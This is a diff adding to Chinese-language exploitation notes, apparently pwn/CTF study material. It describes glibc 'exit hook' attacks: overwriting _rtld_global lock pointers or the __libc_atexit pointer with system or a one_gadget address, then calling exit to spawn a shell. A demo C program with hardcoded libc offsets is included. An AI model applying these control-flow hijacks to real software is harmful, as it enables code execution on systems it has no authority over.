@@ -9,6 +9,8 @@
 修改`_rtld_global._dl_rtld_lock_recursive`为`system`和`_rtld_global._dl_load_lock`为`/bin/sh`
 修改`_rtld_global._dl_rtld_unlock_recursive`为`system`和`_rtld_global._dl_load_lock`为`/bin/sh`
 
+调用exit即可触发漏洞
+
 ## 示例
 
 ```C
@@ -44,3 +46,36 @@ int main(void)
     return 0;
 }
 ```
+
+## exit_hook+
+
+通过`exit()->__run_exit_handlers()`中的`HOOK`如下:
+
+```C
+  if (run_list_atexit)
+    RUN_HOOK (__libc_atexit, ());
+```
+
+但是后面的版本好像都用不了，可以通过`gdb`动调查看`__libc_atexit`是否可写
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void)
+{
+    // p/x &system-$libc
+    char *libc_base = ((char *)(&system) - 0x55410);
+    // IDA进入exit函数后，查找_exit的交叉引用中含有exit的__run_exit_handlers的地方，找到函数指针的地址
+    size_t* hook = libc_base + 0x1ED608;
+    // 设置函数指针的地址为one_gadget的地址
+    *hook = (size_t)(libc_base + 0xe6aee);
+    // 触发
+    exit(1);
+    return 0;
+}
+```
+
+### 寻找__libc_atexit
+
+`IDA`进入`exit`函数后，查找`_exit`的交叉引用中含有`exit`的`__run_exit_handlers`的地方，找到函数指针的地址
